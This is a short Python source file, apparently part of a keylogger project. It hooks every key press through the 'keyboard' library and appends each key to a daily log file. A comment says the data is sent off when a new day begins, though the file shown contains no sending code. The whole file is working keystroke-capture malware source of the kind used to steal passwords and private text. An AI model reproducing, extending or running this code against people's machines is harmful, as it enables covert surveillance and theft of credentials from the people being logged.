import keyboard
from functools import partial
from src.static.auxiliaries import get_actual_date
from src.static.constants import SPECIAL_KEYS

def __log_key(event, filename):
    keyname = event.name

    with open(filename, "a") as keylog_file:
        if keyname in SPECIAL_KEYS:
            keylog_file.write(SPECIAL_KEYS[keyname])
        else:
            keylog_file.write(keyname)

# Start listening for key events
def listen_keyboard():
    # We will create files for each day,
    # resume the logging within the same file,
    # and sending all the data when a new day is detected
    ACTUAL_DATE = get_actual_date()
    filename = f"keylog_{ACTUAL_DATE}.txt"
    
    log_key_callback = partial(__log_key, filename=filename)
    keyboard.on_press(log_key_callback)
    print("Keylogger is running...")
    
    # Keep the script running until 'Esc' is pressed
    keyboard.wait('esc')

    return filename